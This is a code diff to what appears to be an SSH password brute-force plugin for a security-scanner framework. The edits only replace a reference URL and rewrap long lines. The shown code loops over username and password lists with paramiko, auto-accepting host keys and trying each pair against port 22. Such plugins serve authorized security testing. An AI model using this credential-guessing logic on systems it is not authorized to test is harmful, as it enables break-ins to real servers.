@@ -15,7 +15,7 @@ class Vuln(ABVuln):
     desc = """
     加载字典暴力破解SSH密码。
     """  # 漏洞描述
-    ref = "http://www.beebeeto.com"  # 漏洞来源
+    ref = "Unknown"  # 漏洞来源
     cnvd_id = "Unknown"  # cnvd漏洞编号
     cve_id = "Unknown"  # cve编号
     product = "ssh"  # 漏洞应用名称
@@ -33,7 +33,8 @@ class Poc(ABPoc):
     def verify(self):
         try:
             self.output.info(
-                "开始对 {target} 进行 {vuln} 的扫描".format(target=self.target, vuln=self.vuln)
+                "开始对 {target} 进行 {vuln} 的扫描".format(
+                    target=self.target, vuln=self.vuln)
             )
             target = self.target_host
             domain_user = target.split(".")[-2]
@@ -44,7 +45,8 @@ class Poc(ABPoc):
             for pwd in password_list:
                 for user in user_list:
                     client = paramiko.SSHClient()
-                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.set_missing_host_key_policy(
+                        paramiko.AutoAddPolicy())
                     try:
                         client.connect(
                             target, 22, username=user, password=pwd.strip(), timeout=8
